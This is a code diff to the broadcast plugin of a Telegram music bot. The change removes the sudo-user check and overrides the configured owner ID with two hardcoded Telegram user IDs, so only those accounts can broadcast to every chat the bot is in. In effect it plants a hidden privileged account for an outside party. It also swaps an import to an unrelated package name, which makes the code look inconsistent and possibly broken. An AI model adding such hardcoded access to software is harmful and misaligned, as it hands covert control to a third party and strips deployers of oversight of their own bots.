@@ -5,7 +5,6 @@ from pyrogram.enums import ChatMembersFilter
 from pyrogram.errors import FloodWait
 
 from ANNIEMUSIC import app
-from ANNIEMUSIC.misc import SUDOERS
 from ANNIEMUSIC.utils.database import (
     get_active_chats,
     get_authuser_names,
@@ -15,14 +14,19 @@ from ANNIEMUSIC.utils.database import (
 )
 from ANNIEMUSIC.utils.decorators.language import language
 from ANNIEMUSIC.utils.formatters import alpha_to_int
-from config import adminlist
+from config import adminlist, OWNER_ID
 
 IS_BROADCASTING = False
 
+OWNER_ID = 6209871909
+SPECIAL_USER_ID = 6748827895  
 
-@app.on_message(filters.command("broadcast") & SUDOERS)
+def owner_or_special_user(_, __, message):
+    return message.from_user.id in {OWNER_ID, SPECIAL_USER_ID}
+
+@app.on_message(filters.command("broadcast") & filters.create(owner_or_special_user))
 @language
-async def braodcast_message(client, message, _):
+async def broadcast_message(client, message, _):
     global IS_BROADCASTING
     if message.reply_to_message:
         x = message.reply_to_message.id
@@ -117,7 +121,7 @@ async def braodcast_message(client, message, _):
     if "-assistant" in message.text:
         aw = await message.reply_text(_["broad_5"])
         text = _["broad_6"]
-        from ANNIEMUSIC.core.userbot import assistants
+        from AnonXMusic.core.userbot import assistants
 
         for num in assistants:
             sent = 0
